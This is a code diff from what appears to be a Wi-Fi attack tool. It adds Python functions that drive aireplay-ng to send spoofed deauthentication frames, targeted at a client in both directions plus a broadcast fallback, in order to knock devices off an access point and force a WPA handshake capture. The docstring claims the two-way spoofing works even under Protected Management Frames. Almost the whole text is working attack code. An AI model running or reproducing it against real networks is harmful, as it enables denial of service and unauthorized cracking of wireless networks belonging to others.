@@ -393,8 +393,91 @@ def display_clients(clients: list[dict], bssid: str) -> None:
 
 
 
+def send_targeted_deauth(
+    bssid: str,
+    client_mac: str,
+    monitor_interface: str,
+    limiter: DeauthRateLimiter,
+    count: int = DEAUTH_COUNT,
+) -> None:
+    """
+    Send targeted unicast deauth in both directions:
+      AP -> Client  (spoofed as AP, forces client to reassociate)
+      Client -> AP  (spoofed as client, forces AP to drop association)
+
+    Both directions together reliably trigger a 4-way handshake even when
+    one direction is filtered by Protected Management Frames.
+    """
+    from rich.console import Console
+    con = Console()
+
+    # Rate-limit per-client to avoid hammering the same device
+    limiter.wait_for_burst(bssid, client_mac)
+
+    # Direction 1: AP -> Client
+    con.print(
+        f"[dim cyan]  ↳ Deauth [bold]{bssid}[/bold] -> "
+        f"[bold]{client_mac}[/bold] ({count} pkts)...[/]"
+    )
+    subprocess.run(
+        ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
+         monitor_interface],
+        capture_output=True,
+        timeout=count * 2 + 8,
+    )
+
+    time.sleep(0.15)
+
+    # Direction 2: Client -> AP (reversed -a/-c tricks aireplay-ng into spoofing
+    # the client MAC as source, instructing the AP to drop the association)
+    con.print(
+        f"[dim cyan]  ↳ Deauth [bold]{client_mac}[/bold] -> "
+        f"[bold]{bssid}[/bold] ({count} pkts)...[/]"
+    )
+    subprocess.run(
+        ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
+         monitor_interface],
+        capture_output=True,
+        timeout=count * 2 + 8,
+    )
+
+    logger.info(
+        "Targeted deauth sent: bssid=%s client=%s count=%d",
+        bssid, client_mac, count,
+    )
+
+
+def send_broadcast_deauth_fallback(
+    bssid: str,
+    monitor_interface: str,
+    limiter: DeauthRateLimiter,
+    count: int = 16,
+) -> None:
+    """Broadcast deauth -- fallback only when no clients are discovered."""
+    from rich.console import Console
+    con = Console()
+
+    limiter.wait_for_burst(bssid)
+    con.print(
+        f"[dim yellow]  ↳ Broadcast deauth fallback on {bssid} ({count} pkts)...[/]"
+    )
+    subprocess.run(
+        ["aireplay-ng", "-0", str(count), "-a", bssid, monitor_interface],
+        capture_output=True,
+        timeout=count * 2 + 10,
+    )
+    logger.info("Broadcast deauth fallback: bssid=%s count=%d", bssid, count)
+
+
 def _deauth_capture(
-    interface, bssid, channel, cap_base, timeout, auto, limiter: DeauthRateLimiter
+    interface: str,
+    bssid: str,
+    ssid: str,
+    channel: int,
+    cap_base: str,
+    timeout: int,
+    auto: bool,
+    limiter: DeauthRateLimiter,
 ) -> Optional[str]:
     client_mac = "FF:FF:FF:FF:FF:FF"
     if not auto:
